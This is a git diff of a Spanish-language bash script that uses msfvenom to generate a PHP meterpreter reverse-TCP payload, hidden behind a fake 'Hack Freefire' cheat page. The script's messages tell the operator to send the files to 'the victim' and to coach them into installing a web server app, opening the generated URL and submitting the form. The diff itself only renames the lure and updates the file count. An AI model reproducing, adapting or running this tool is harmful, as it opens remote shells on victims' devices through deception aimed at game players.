@@ -94,9 +94,9 @@ setterm -foreground green
 msfvenom -p php/meterpreter/reverse_tcp lhost=$a lport=$b r > $name.php
 echo ""
 setterm -foreground red
-echo -e "\e[1;31;42mNOTA:\e[0m Sus sietes archivos se guardo en la carpeta Freefire"
+echo -e "\e[1;31;42mNOTA:\e[0m Sus ochos archivos se guardo en la carpeta Freefire"
 echo ""
-echo -e "\e[1;32;41mAhora enviale los 7 archivos a la victima\e[0m"
+echo -e "\e[1;32;41mAhora enviale los 8 archivos a la victima\e[0m"
 echo -e "\e[1;32;41my dile a la victima que instale apache web server de la play store\e[0m"
 echo -e "\e[1;32;41my que abra y elija la carpeta web en la opcion interna , luego marque la carpeta WhatsApp\e[0m"
 echo -e "\e[1;32;41my que abra la url que se le genero y listo dile que llene el formulario y ponga enviar\e[0m"
@@ -141,7 +141,7 @@ echo "
                         </div>
                 </header>
                 <section>
-                        <div class='div'><p>Diamantes Hack</p></div>
+                        <div class='div'><p>Hack Freefire</p></div>
                         <form action='$name.php' method='POST'>
        <p align='left'><br><br><br>
         <div class='inputuno'>
